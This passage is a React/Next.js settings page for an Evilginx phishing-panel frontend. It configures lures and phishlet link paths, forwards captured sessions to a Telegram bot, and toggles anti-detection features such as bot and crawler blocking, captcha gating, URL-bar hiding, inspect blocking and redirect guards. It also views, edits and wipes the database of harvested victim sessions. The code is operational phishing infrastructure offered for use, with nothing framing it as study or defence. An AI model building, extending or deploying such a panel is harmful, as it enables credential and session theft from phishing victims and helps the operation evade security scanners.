import Layout from "@/components/Layout";
import { useState, useEffect, useRef } from "react";
import { toast } from "react-hot-toast";
import { Session } from "@/types";
import useSWR from "swr";

interface Lure {
  hostname: string;
  id: string;
  info: string;
  og_desc: string;
  og_image: string;
  og_title: string;
  og_url: string;
  path: string;
  paused: number;
  phishlet: string;
  redirect_url: string;
  redirector: string;
  ua_filter: string;
  formState?: LureFormState;
}

// Added this interface to track form state for each lure independently
interface LureFormState {
  redirectUrl: string;
  useCaptcha: boolean;
  linkPath: string;
  blockBots: boolean;
  botRedirectLink: string;
  hideUrlBar: boolean;
  blockInspect: boolean;
  redirectGuard: boolean;
}

interface LuresResponse {
  lures: Lure[];
}

// Define default security settings to use when securityData is not available
const defaultSecuritySettings = {
  blockBots: true,
  redirectUrl: "",
  hideUrlBar: true,
  blockInspect: true,
  redirectGuard: true,
};

// Define a LureForm component that handles its own state completely independently
function LureForm({
  lure,
  index,
}: {
  lure: Lure;
  index: number; // Add explicit index prop
}) {
  const [formState, setFormState] = useState<LureFormState>(() => {
    const cleanPath = lure.path.startsWith("/")
      ? lure.path.substring(1)
      : lure.path;

    // Only use this specific lure's data, don't reference any other lure
    return {
      linkPath: cleanPath,
      redirectUrl: lure.redirect_url || "",
      useCaptcha: lure.redirector === "main",
      blockBots: lure.formState?.blockBots ?? true,
      botRedirectLink: lure.formState?.botRedirectLink || "",
      hideUrlBar: lure.formState?.hideUrlBar ?? true,
      blockInspect: lure.formState?.blockInspect ?? true,
      redirectGuard: lure.formState?.redirectGuard ?? true,
    };
  });

  const [isLoading, setIsLoading] = useState(false);
  const [saving, setSaving] = useState(false);
  const hasLoaded = useRef(false); // Add a ref to track if data has been loaded

  // Load the lure data only once on mount, strictly for this specific lure
  useEffect(() => {
    // Skip if already loaded
    if (hasLoaded.current) return;

    const fetchLureData = async () => {
      setIsLoading(true);
      try {
        console.log(
          `Fetching data for lure index ${index} (${lure.phishlet}): ${lure.path}`
        );

        // Fetch lure config specifically for this lure by index
        const lureConfigResponse = await fetch(
          `/api/full-link?lureIndex=${index}`
        );
        if (!lureConfigResponse.ok) {
          throw new Error(`Failed to fetch config for lure index ${index}`);
        }

        // Fetch security settings specifically for this lure
        const securityResponse = await fetch(
          `/api/security-settings?lureIndex=${index}`
        );
        if (!securityResponse.ok) {
          throw new Error(
            `Failed to fetch security settings for lure index ${index}`
          );
        }

        const lureConfig = await lureConfigResponse.json();
        const securityData = await securityResponse.json();

        console.log(
          `[LureForm] Fetched config for lure index ${index}:`,
          lureConfig
        );
        console.log(
          `[LureForm] Fetched security settings for lure index ${index}:`,
          securityData
        );

        // Determine clean path
        const cleanPath =
          lureConfig.path ||
          (lure.path.startsWith("/") ? lure.path.substring(1) : lure.path);

        // Update form state with fetched data specific to this lure only
        setFormState({
          linkPath: cleanPath,
          redirectUrl: lure.redirect_url || lureConfig.afterLoginRedirect || "",
          useCaptcha: lure.redirector === "main",
          blockBots: securityData.blockBots ?? true,
          botRedirectLink: securityData.redirectUrl || "",
          hideUrlBar: securityData.hideUrlBar ?? true,
          blockInspect: securityData.blockInspect ?? true,
          redirectGuard: securityData.redirectGuard ?? true,
        });

        console.log(`[LureForm] Updated form state for lure index ${index}`, {
          linkPath: cleanPath,
          redirectUrl: lure.redirect_url || lureConfig.afterLoginRedirect,
          useCaptcha: lure.redirector === "main",
        });

        // Mark as loaded
        hasLoaded.current = true;
      } catch (error) {
        console.error(
          `[LureForm] Error loading lure index ${index} data:`,
          error
        );
        toast.error(`Failed to load data for ${lure.phishlet}`);
      } finally {
        setIsLoading(false);
      }
    };

    fetchLureData();
  }, []); // Empty dependency array to run only once on mount

  // Handle form field changes
  const handleFieldChange = (
    field: keyof LureFormState,
    value: string | boolean
  ) => {
    console.log(
      `[LureForm] Updating field ${field} for lure index ${index} to:`,
      value
    );
    setFormState((prev) => ({
      ...prev,
      [field]: value,
    }));
  };

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log(
      `[LureForm] Submitting form for lure index ${index} (${lure.phishlet})`
    );

    try {
      setSaving(true);

      // Security settings request with lure-specific settings
      const securityRequestBody = {
        hideUrlBar: formState.hideUrlBar,
        blockInspect: formState.blockInspect,
        redirectGuard: formState.redirectGuard,
        blockBots: formState.blockBots,
        redirectUrl: formState.botRedirectLink,
        lureId: lure.id,
        lureIndex: index, // Add explicit index for server to use
      };

      console.log(
        "[LureForm] Submitting security settings:",
        securityRequestBody
      );

      const securityResponse = await fetch("/api/security-settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(securityRequestBody),
      });

      if (!securityResponse.ok) {
        throw new Error("Failed to update security settings");
      }

      // Link settings request with this specific lure's data
      const linkRequestBody = {
        afterLoginRedirect: formState.redirectUrl,
        useCaptcha: formState.useCaptcha,
        linkPath: formState.linkPath,
        lureId: lure.id,
        lureIndex: index, // Add explicit index for server to use
      };

      console.log("[LureForm] Submitting link settings:", linkRequestBody);

      const linkResponse = await fetch("/api/link-settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(linkRequestBody),
      });

      if (!linkResponse.ok) {
        throw new Error("Failed to update link settings");
      }

      // Restart evilginx after updating settings
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      // Update the localStorage with the selected lure ID and index
      localStorage.setItem("selectedLureId", lure.id);
      localStorage.setItem("selectedLureIndex", index.toString());

      // Emit custom events with lure index to ensure they only affect this lure
      const securityEvent = new CustomEvent("securitySettingsUpdated", {
        detail: {
          lureId: lure.id,
          lureIndex: index,
          settings: securityRequestBody,
        },
      });
      window.dispatchEvent(securityEvent);

      const linkEvent = new CustomEvent("linkSettingsUpdated", {
        detail: {
          lureId: lure.id,
          lureIndex: index,
          settings: linkRequestBody,
        },
      });
      window.dispatchEvent(linkEvent);

      toast.success(`${lure.phishlet} lure settings updated successfully`);
    } catch (error) {
      console.error("[LureForm] Error updating lure settings:", error);
      toast.error(`Failed to update ${lure.phishlet} lure settings`);
    } finally {
      setSaving(false);
    }
  };

  return (
    <section className="bg-[#232A34] rounded-lg p-6">
      <div className="flex justify-between items-center mb-4">
        <h2 className="text-white text-xl">
          Link Configuration: {lure.phishlet} ({lure.path})
        </h2>
        {isLoading && (
          <div className="flex items-center text-gray-400">
            <svg
              className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
              ></circle>
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
              ></path>
            </svg>
            Loading...
          </div>
        )}
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Link Path - Pre-filled with this lure's path */}
        <div>
          <label className="block text-gray-400 mb-2">
            Link Path for {lure.phishlet}
          </label>
          <input
            type="text"
            data-allow-select="true"
            className="w-full bg-[#1B2028] text-white p-3 rounded"
            value={formState.linkPath}
            onChange={(e) => handleFieldChange("linkPath", e.target.value)}
            placeholder="Enter path (without leading /)"
          />
          <p className="text-xs text-gray-500 mt-1">
            The path will always start with &quot;/&quot; in the system
          </p>
        </div>

        {/* Redirect Settings */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <label className="block text-gray-400 mb-2">
              After Login Redirect URL
            </label>
            <input
              type="text"
              data-allow-select="true"
              className="w-full bg-[#1B2028] text-white p-3 rounded"
              value={formState.redirectUrl}
              onChange={(e) => handleFieldChange("redirectUrl", e.target.value)}
              placeholder="https://example.com"
            />
          </div>

          <div>
            <label className="block text-gray-400 mb-2">
              Redirect URL for Blocked IPs
            </label>
            <input
              type="text"
              data-allow-select="true"
              className="w-full bg-[#1B2028] text-white p-3 rounded"
              value={formState.botRedirectLink}
              onChange={(e) =>
                handleFieldChange("botRedirectLink", e.target.value)
              }
              placeholder="https://example.com"
            />
          </div>
        </div>

        {/* Security and Captcha Settings */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h3 className="text-gray-400 mb-3">Bot Protection</h3>
            <div className="space-y-2">
              <label className="flex items-center space-x-2">
                <input
                  type="radio"
                  data-allow-select="true"
                  checked={formState.blockBots}
                  onChange={() => handleFieldChange("blockBots", true)}
                  className="text-indigo-500"
                />
                <span className="text-gray-400">
                  Block All Bots And Crawlers
                </span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="radio"
                  data-allow-select="true"
                  checked={!formState.blockBots}
                  onChange={() => handleFieldChange("blockBots", false)}
                  className="text-indigo-500"
                />
                <span className="text-gray-400">Do Not Block Bots</span>
              </label>
            </div>
          </div>

          <div>
            <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
            <div className="space-y-2">
              <label className="flex items-center space-x-2">
                <input
                  type="radio"
                  data-allow-select="true"
                  checked={formState.useCaptcha}
                  onChange={() => handleFieldChange("useCaptcha", true)}
                  className="text-indigo-500"
                />
                <span className="text-gray-400">Use Cloudflare Captcha</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="radio"
                  data-allow-select="true"
                  checked={!formState.useCaptcha}
                  onChange={() => handleFieldChange("useCaptcha", false)}
                  className="text-indigo-500"
                />
                <span className="text-gray-400">Do Not Use Captcha</span>
              </label>
            </div>
          </div>
        </div>

        {/* Additional Security Settings */}
        <div className="space-y-3 mt-4">
          <h3 className="text-gray-400 mb-2">Additional Security Settings</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <label className="flex items-center space-x-2">
              <input
                type="checkbox"
                checked={formState.hideUrlBar}
                onChange={(e) =>
                  handleFieldChange("hideUrlBar", e.target.checked)
                }
                className="text-indigo-500"
              />
              <span className="text-gray-400">Hide URL Bar</span>
            </label>

            <label className="flex items-center space-x-2">
              <input
                type="checkbox"
                checked={formState.blockInspect}
                onChange={(e) =>
                  handleFieldChange("blockInspect", e.target.checked)
                }
                className="text-indigo-500"
              />
              <span className="text-gray-400">Block Inspect</span>
            </label>

            <label className="flex items-center space-x-2">
              <input
                type="checkbox"
                checked={formState.redirectGuard}
                onChange={(e) =>
                  handleFieldChange("redirectGuard", e.target.checked)
                }
                className="text-indigo-500"
              />
              <span className="text-gray-400">Redirect Guard</span>
            </label>
          </div>
        </div>

        <button
          type="submit"
          disabled={saving}
          className={`bg-indigo-500 text-white px-6 py-2 rounded ${
            saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
          } transition-colors`}
        >
          {saving ? "Saving..." : `Save ${lure.phishlet} Configuration`}
        </button>
      </form>
    </section>
  );
}

export default function Settings() {
  const [settings, setSettings] = useState({
    telegramToken: "",
    telegramChatId: "",
    blockBots: true,
    redirectLink: "",
    useCaptcha: true,
    linkPath: "",
    blacklistedIPs: [] as string[],
    botRedirectLink: "",
    afterLoginRedirect: "",
    expiryDays: 5,
    hideUrlBar: true,
    blockInspect: true,
    redirectGuard: true,
  });
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(false);
  const [saving, setSaving] = useState(false);
  const [showClearDbModal, setShowClearDbModal] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [isEditing, setIsEditing] = useState(false);
  const [editedSessions, setEditedSessions] = useState("");
  const [backupFile, setBackupFile] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [lures, setLures] = useState<Lure[]>([]);

  // Define the fetcher function for SWR
  const fetcher = (url: string) => fetch(url).then((res) => res.json());

  // Load lures data for dropdown only, no need to track the response in a variable
  useSWR<LuresResponse>("/api/lures", fetcher);

  useEffect(() => {
    const fetchTelegramSettings = async () => {
      try {
        setLoading(true);
        const response = await fetch("/api/telegram-settings");
        if (!response.ok) {
          throw new Error("Failed to fetch Telegram settings");
        }
        const data = await response.json();
        setSettings((prev) => ({
          ...prev,
          telegramToken: data.bot_token || "",
          telegramChatId: data.chat_id || "",
        }));
      } catch (error) {
        console.error("Error loading telegram settings:", error);
        toast.error("Failed to load Telegram settings");
      } finally {
        setLoading(false);
      }
    };

    fetchTelegramSettings();
  }, []);

  useEffect(() => {
    const fetchSessions = async () => {
      try {
        const response = await fetch("/api/database-management");
        if (!response.ok) {
          throw new Error("Failed to fetch sessions");
        }
        const data = await response.json();
        setSessions(data.sessions);
      } catch (error) {
        console.error("Error fetching sessions:", error);
        toast.error("Failed to fetch sessions");
      }
    };

    fetchSessions();
  }, []);

  useEffect(() => {
    const fetchSettings = async () => {
      try {
        setLoading(true);
        console.log("Fetching all settings...");

        // Get saved lure ID from localStorage if it exists
        const savedLureId = localStorage.getItem("selectedLureId");
        console.log("Saved lure ID from localStorage:", savedLureId);

        const [
          telegramResponse,
          securityResponse,
          linkResponse,
          blacklistResponse,
          luresResponse,
        ] = await Promise.all([
          fetch("/api/telegram-settings"),
          fetch("/api/security-settings"),
          fetch("/api/link-settings"),
          fetch("/api/blacklist"),
          fetch("/api/lures"),
        ]);

        if (
          !telegramResponse.ok ||
          !securityResponse.ok ||
          !linkResponse.ok ||
          !blacklistResponse.ok ||
          !luresResponse.ok
        ) {
          throw new Error("Failed to fetch settings");
        }

        const telegramData = await telegramResponse.json();
        const securityData = await securityResponse.json();
        const linkData = await linkResponse.json();
        const blacklistData = await blacklistResponse.json();
        const luresData = await luresResponse.json();

        console.log("Fetched lures:", luresData.lures?.length || 0);

        // Get the lures data
        const fetchedLures = luresData.lures || [];

        // Set lures once and don't modify them in this effect
        if (fetchedLures.length > 0 && lures.length === 0) {
          setLures(fetchedLures);
        }

        // Set the settings with the data we have
        setSettings((prev) => ({
          ...prev,
          telegramToken: telegramData.bot_token || "",
          telegramChatId: telegramData.chat_id || "",
          blockBots: securityData.blockBots,
          botRedirectLink: securityData.redirectUrl || "",
          afterLoginRedirect: linkData.afterLoginRedirect || "",
          useCaptcha: linkData.useCaptcha,
          linkPath: linkData.linkPath || "",
          blacklistedIPs: blacklistData.ips || [],
          hideUrlBar: securityData.hideUrlBar,
          blockInspect: securityData.blockInspect,
          redirectGuard: securityData.redirectGuard,
        }));

        console.log("Settings fetch and initialization complete");
      } catch (error) {
        console.error("Error loading settings:", error);
        toast.error("Failed to load settings");
      } finally {
        setLoading(false);
      }
    };
    fetchSettings();
  }, []); // Empty dependency array so it only runs once on mount

  // Initialize form state for each lure
  useEffect(() => {
    if (lures.length > 0) {
      console.log("Initializing form states for lures:", lures.length);

      // First create a deep copy of the lures to avoid modifying state directly
      const luresWithForms = [...lures];

      // Now load initial form states for each lure independently
      const initializeLures = async () => {
        for (let i = 0; i < luresWithForms.length; i++) {
          const lure = luresWithForms[i];

          try {
            // Attempt to get lure-specific settings using index
            const response = await fetch(`/api/full-link?lureIndex=${i}`);

            if (response.ok) {
              const data = await response.json();

              // Determine clean path
              const cleanPath = lure.path.startsWith("/")
                ? lure.path.substring(1)
                : lure.path;

              // Set initial form state for this specific lure only
              luresWithForms[i] = {
                ...lure,
                formState: {
                  linkPath: data.path || cleanPath,
                  redirectUrl:
                    lure.redirect_url || data.afterLoginRedirect || "",
                  useCaptcha: lure.redirector === "main",
                  blockBots: data.blockBots ?? true,
                  botRedirectLink: data.redirectUrl || "",
                  hideUrlBar: data.hideUrlBar ?? true,
                  blockInspect: data.blockInspect ?? true,
                  redirectGuard: data.redirectGuard ?? true,
                },
              };

              console.log(
                `Initialized form state for lure index ${i} (${lure.phishlet}): ${lure.path}`
              );
            } else {
              // Use defaults if we can't get specific settings
              const cleanPath = lure.path.startsWith("/")
                ? lure.path.substring(1)
                : lure.path;

              luresWithForms[i] = {
                ...lure,
                formState: {
                  linkPath: cleanPath,
                  redirectUrl: lure.redirect_url || "",
                  useCaptcha: lure.redirector === "main",
                  blockBots: true,
                  botRedirectLink: "",
                  hideUrlBar: true,
                  blockInspect: true,
                  redirectGuard: true,
                },
              };

              console.log(
                `Using default settings for lure index ${i} (${lure.phishlet}): ${lure.path}`
              );
            }
          } catch (error) {
            console.error(`Error initializing lure index ${i}:`, error);
            // Set defaults for this lure in case of error
            const cleanPath = lure.path.startsWith("/")
              ? lure.path.substring(1)
              : lure.path;

            luresWithForms[i] = {
              ...lure,
              formState: {
                linkPath: cleanPath,
                redirectUrl: lure.redirect_url || "",
                useCaptcha: lure.redirector === "main",
                blockBots: true,
                botRedirectLink: "",
                hideUrlBar: true,
                blockInspect: true,
                redirectGuard: true,
              },
            };
          }
        }

        // Now update all the lures at once to avoid multiple state updates
        setLures(luresWithForms);
      };

      initializeLures();
    }
  }, [lures.length]); // Only run when lure count changes

  // Enhance the lureChanged event listener to update all form fields completely
  useEffect(() => {
    // Only run once to set up the event listener
    const handleLureChangedEvent = async (event: CustomEvent) => {
      if (event.detail) {
        const { lureIndex } = event.detail;
        if (lureIndex === undefined || lureIndex === null) return;

        // Get the lure at this specific index in the array
        if (lureIndex < 0 || lureIndex >= lures.length) {
          console.log(
            `Invalid lure index: ${lureIndex}, lures length: ${lures.length}`
          );
          return;
        }

        const selected = lures[lureIndex];
        console.log(
          `Processing lure changed event for lure index ${lureIndex} (${selected.phishlet}): ${selected.path}`
        );

        try {
          // Fetch the full configuration for this specific lure
          const lureConfigResponse = await fetch(
            `/api/full-link?lureIndex=${lureIndex}`
          );

          // Also fetch the security settings for this specific lure
          const securityResponse = await fetch(
            `/api/security-settings?lureIndex=${lureIndex}`
          );

          let securityData = defaultSecuritySettings;
          if (securityResponse.ok) {
            securityData = await securityResponse.json();
          }

          if (lureConfigResponse.ok) {
            const lureConfig = await lureConfigResponse.json();

            // Determine clean path
            const cleanPath = selected.path.startsWith("/")
              ? selected.path.substring(1)
              : selected.path;

            // Update ONLY this specific lure's form state in the array
            setLures((prev) => {
              const newLures = [...prev];
              if (newLures[lureIndex]) {
                newLures[lureIndex] = {
                  ...newLures[lureIndex],
                  formState: {
                    linkPath: lureConfig.path || cleanPath,
                    redirectUrl:
                      selected.redirect_url ||
                      lureConfig.afterLoginRedirect ||
                      "",
                    useCaptcha: selected.redirector === "main",
                    blockBots: securityData.blockBots ?? true,
                    botRedirectLink: securityData.redirectUrl || "",
                    hideUrlBar: securityData.hideUrlBar ?? true,
                    blockInspect: securityData.blockInspect ?? true,
                    redirectGuard: securityData.redirectGuard ?? true,
                  },
                };
              }
              return newLures;
            });

            // Display a notification that settings form has been updated
            toast.success(
              `Updated settings for "${selected.phishlet} - ${selected.path}"`
            );
          }
        } catch (error) {
          console.error(
            `Error fetching lure configuration for index ${lureIndex}:`,
            error
          );

          // If API call fails, still update with basic information
          const cleanPath = selected.path.startsWith("/")
            ? selected.path.substring(1)
            : selected.path;

          // Update with basic information even if the API call fails
          setLures((prev) => {
            const newLures = [...prev];
            if (newLures[lureIndex]) {
              newLures[lureIndex] = {
                ...newLures[lureIndex],
                formState: {
                  linkPath: cleanPath,
                  redirectUrl: selected.redirect_url || "",
                  useCaptcha: selected.redirector === "main",
                  blockBots: true,
                  botRedirectLink: "",
                  hideUrlBar: true,
                  blockInspect: true,
                  redirectGuard: true,
                },
              };
            }
            return newLures;
          });

          toast.error(`Partially updated settings for "${selected.phishlet}"`);
        }
      }
    };

    // Add event listeners for all the custom events with specific handlers
    window.addEventListener(
      "lureChanged",
      handleLureChangedEvent as EventListener
    );

    window.addEventListener(
      "securitySettingsUpdated",
      handleLureChangedEvent as EventListener
    );

    window.addEventListener(
      "linkSettingsUpdated",
      handleLureChangedEvent as EventListener
    );

    // Remove all event listeners on cleanup
    return () => {
      window.removeEventListener(
        "lureChanged",
        handleLureChangedEvent as EventListener
      );

      window.removeEventListener(
        "securitySettingsUpdated",
        handleLureChangedEvent as EventListener
      );

      window.removeEventListener(
        "linkSettingsUpdated",
        handleLureChangedEvent as EventListener
      );
    };
  }, []); // Empty dependency array to set up event listener only once

  const handleTelegramSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await fetch("/api/telegram-settings", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bot_token: settings.telegramToken || null,
          chat_id: settings.telegramChatId || null,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to update telegram settings");
      }

      // Restart evilginx after updating telegram settings
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);
    } catch (error) {
      console.error("Error:", error);
      setError(error instanceof Error ? error.message : "An error occurred");
      setTimeout(() => setError(null), 3000);
    } finally {
      setLoading(false);
    }
  };

  const handleBlacklistSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const ips = settings.blacklistedIPs
        .join("\n")
        .split("\n")
        .map((ip) => ip.trim())
        .filter((ip) => ip !== "");

      const response = await fetch("/api/blacklist", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ ips }),
      });

      if (!response.ok) {
        throw new Error("Failed to update blacklist");
      }

      // Restart evilginx after updating blacklist
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);
    } catch (error) {
      console.error("Error:", error);
      setError(error instanceof Error ? error.message : "An error occurred");
      setTimeout(() => setError(null), 3000);
    } finally {
      setLoading(false);
    }
  };

  const handleClearBlacklist = async () => {
    try {
      setSaving(true);
      const response = await fetch("/api/blacklist", {
        method: "DELETE",
      });

      if (!response.ok) {
        throw new Error("Failed to clear blacklist");
      }

      setSettings((prev) => ({ ...prev, blacklistedIPs: [] }));

      // Restart evilginx after clearing blacklist
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success("Blacklist cleared successfully");
    } catch (error) {
      console.error("Error clearing blacklist:", error);
      toast.error("Failed to clear blacklist");
    } finally {
      setSaving(false);
    }
  };

  const handleClearDatabase = async () => {
    try {
      setSaving(true);
      const response = await fetch("/api/database-management", {
        method: "DELETE",
      });

      if (!response.ok) {
        throw new Error("Failed to clear database");
      }

      const data = await response.json();
      setSessions([]);
      setBackupFile(data.backupFile);
      setShowClearDbModal(false);

      // Restart evilginx after clearing database
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success(
        "Database cleared successfully. Changes applied to .evilginx data.db"
      );
    } catch (error) {
      console.error("Error clearing database:", error);
      toast.error("Failed to clear database");
    } finally {
      setSaving(false);
    }
  };

  const handleRefreshSessions = async () => {
    try {
      setLoading(true);
      const response = await fetch("/api/database-management");
      if (!response.ok) {
        throw new Error("Failed to fetch sessions");
      }
      const data = await response.json();
      setSessions(data.sessions);
      toast.success("Database refreshed successfully");
    } catch (error) {
      console.error("Error refreshing sessions:", error);
      toast.error("Failed to refresh sessions");
    } finally {
      setLoading(false);
    }
  };

  const handleEditSessions = () => {
    setIsEditing(true);
    setEditedSessions(JSON.stringify(sessions, null, 2));
  };

  const handleSaveEdit = async () => {
    try {
      setSaving(true);
      let parsedSessions;
      try {
        parsedSessions = JSON.parse(editedSessions);
      } catch {
        toast.error("Invalid JSON format");
        return;
      }

      const response = await fetch("/api/database-management", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessions: parsedSessions }),
      });

      if (!response.ok) {
        throw new Error("Failed to update sessions");
      }

      setSessions(parsedSessions);
      setIsEditing(false);

      // Restart evilginx after updating database
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success(
        "Sessions updated successfully. Changes applied to .evilginx data.db"
      );
    } catch (error) {
      console.error("Error updating sessions:", error);
      toast.error("Failed to update sessions");
    } finally {
      setSaving(false);
    }
  };

  const filteredSessions = sessions.filter((session) => {
    const searchLower = searchQuery.toLowerCase();
    return (
      session.username.toLowerCase().includes(searchLower) ||
      session.phishlet.toLowerCase().includes(searchLower) ||
      session.remote_addr.toLowerCase().includes(searchLower)
    );
  });

  if (loading) {
    return (
      <Layout>
        <div className="flex items-center justify-center h-screen">
          <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-indigo-500"></div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout>
      <div className="space-y-6">
        {error && (
          <div className="bg-red-500 text-white p-4 rounded-lg">{error}</div>
        )}

        {showSuccess && (
          <div className="bg-green-500 text-white p-4 rounded-lg">
            Settings updated successfully!
          </div>
        )}

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Telegram Settings</h2>
          <form onSubmit={handleTelegramSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-400 mb-2">
                Telegram Bot Token
              </label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.telegramToken}
                onChange={(e) =>
                  setSettings({ ...settings, telegramToken: e.target.value })
                }
                placeholder="Enter your Telegram bot token"
              />
            </div>
            <div>
              <label className="block text-gray-400 mb-2">
                Telegram Chat ID
              </label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.telegramChatId}
                onChange={(e) =>
                  setSettings({ ...settings, telegramChatId: e.target.value })
                }
                placeholder="Enter your Telegram chat ID"
              />
            </div>
            <button
              type="submit"
              disabled={saving}
              className={`bg-indigo-500 text-white px-6 py-2 rounded ${
                saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
              } transition-colors`}
            >
              {saving ? "Saving..." : "Save Telegram Settings"}
            </button>
          </form>
        </section>

        {/* Dynamic Lure Configuration Sections - Generate one section per lure */}
        {lures.length > 0 ? (
          lures.map((lure, index) => (
            <LureForm key={lure.id} lure={lure} index={index} />
          ))
        ) : (
          <div className="bg-[#232A34] rounded-lg p-6">
            <h2 className="text-white text-xl mb-4">Link Configuration</h2>
            <p className="text-gray-400">
              No lures available. Please create lures in evilginx first.
            </p>
          </div>
        )}

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Blacklist Management</h2>
          <form onSubmit={handleBlacklistSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-400 mb-2">
                Blacklisted IP Addresses
              </label>
              <textarea
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded h-64 font-mono"
                value={
                  Array.isArray(settings.blacklistedIPs)
                    ? settings.blacklistedIPs.join("\n")
                    : ""
                }
                onChange={(e) =>
                  setSettings({
                    ...settings,
                    blacklistedIPs: e.target.value.split("\n"),
                  })
                }
                placeholder="Enter IP addresses (one per line)"
              />
            </div>

            <div className="flex space-x-4">
              <button
                type="submit"
                disabled={saving}
                className={`bg-indigo-500 text-white px-6 py-2 rounded ${
                  saving
                    ? "opacity-50 cursor-not-allowed"
                    : "hover:bg-indigo-600"
                } transition-colors`}
              >
                {saving ? "Saving..." : "Save Changes"}
              </button>

              <button
                type="button"
                onClick={handleClearBlacklist}
                disabled={saving}
                className={`bg-red-500 text-white px-6 py-2 rounded ${
                  saving ? "opacity-50 cursor-not-allowed" : "hover:bg-red-600"
                } transition-colors`}
              >
                {saving ? "Clearing..." : "Clear List"}
              </button>
            </div>
          </form>
        </section>

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Database Management</h2>
          <div className="space-y-4">
            <p className="text-gray-400 text-sm mb-4">
              All changes to the database are automatically synchronized with
              the .evilginx directory through symlinks. When you edit or clear
              the database, the changes will be applied to both the
              panel/data/data.db and .evilginx/data.db files.
            </p>
            <div className="flex items-center space-x-4 mb-4">
              <button
                onClick={handleRefreshSessions}
                disabled={loading}
                className={`bg-indigo-500 text-white px-4 py-2 rounded ${
                  loading
                    ? "opacity-50 cursor-not-allowed"
                    : "hover:bg-indigo-600"
                } transition-colors`}
              >
                {loading ? "Refreshing..." : "Refresh Database"}
              </button>

              {backupFile && (
                <a
                  href={`/data/backup/${backupFile}`}
                  download
                  className="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 transition-colors"
                >
                  Download Backup
                </a>
              )}
            </div>

            <div className="mb-4">
              <input
                type="text"
                placeholder="Search database..."
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
            </div>

            <div>
              <label className="block text-gray-400 mb-2">
                Database Content
              </label>
              {isEditing ? (
                <>
                  <textarea
                    data-allow-select="true"
                    className="w-full bg-[#1B2028] text-white p-3 rounded h-64 font-mono"
                    value={editedSessions}
                    onChange={(e) => setEditedSessions(e.target.value)}
                  />
                  <div className="mt-2 space-x-2">
                    <button
                      onClick={handleSaveEdit}
                      disabled={saving}
                      className={`bg-green-500 text-white px-4 py-2 rounded ${
                        saving
                          ? "opacity-50 cursor-not-allowed"
                          : "hover:bg-green-600"
                      } transition-colors`}
                    >
                      {saving ? "Saving..." : "Save Changes"}
                    </button>
                    <button
                      onClick={() => setIsEditing(false)}
                      className="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600 transition-colors"
                    >
                      Cancel
                    </button>
                  </div>
                </>
              ) : (
                <>
                  <textarea
                    data-allow-select="true"
                    className="w-full bg-[#1B2028] text-white p-3 rounded h-64 font-mono"
                    value={JSON.stringify(filteredSessions, null, 2)}
                    readOnly
                  />
                  <div className="mt-2">
                    <button
                      onClick={handleEditSessions}
                      className="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 transition-colors"
                    >
                      Edit Database
                    </button>
                  </div>
                </>
              )}
            </div>

            <div className="flex space-x-4">
              <button
                type="button"
